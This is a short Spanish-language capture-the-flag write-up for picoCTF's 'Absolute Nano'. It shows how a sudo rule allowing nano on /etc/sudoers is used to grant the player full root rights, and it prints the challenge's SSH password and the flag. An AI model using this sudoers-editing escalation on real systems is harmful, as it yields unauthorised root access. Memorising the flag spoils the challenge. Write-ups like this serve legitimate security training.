# ABSOLUTE NANO

# Descripción

You have complete power with nano. Think you can get the flag? ssh -p 61364 ctf-player@crystal-peak.picoctf.net using password c4feea17
# Solución

```  
picoCTF{n4n0_411_7h3_w4y_7fcf8f8d}
```

## Pasos

### Entrar a las configuraciones de permisos de usuario usando bin

```  
ctf-player@challenge:~$ sudo /bin/nano /etc/sudoers

```

*(Archivo resultante)*

```  
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr>

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
ctf-player ALL=(ALL) NOPASSWD: /bin/nano /etc/sudoers


```

### Modificar lo para tener los permisos necesarios

```  
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr>

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
ctf-player  ALL=(ALL:ALL) ALL


```


### Guardar y usar cat para ver la bandera

```  
sudo cat flag.txt 
picoCTF{n4n0_411_7h3_w4y_7fcf8f8d}
```

# Notas adicionales

https://gtfobins.org/gtfobins/nano/#file-read
https://www.youtube.com/watch?v=lh74sWyu8mc

# Referencias

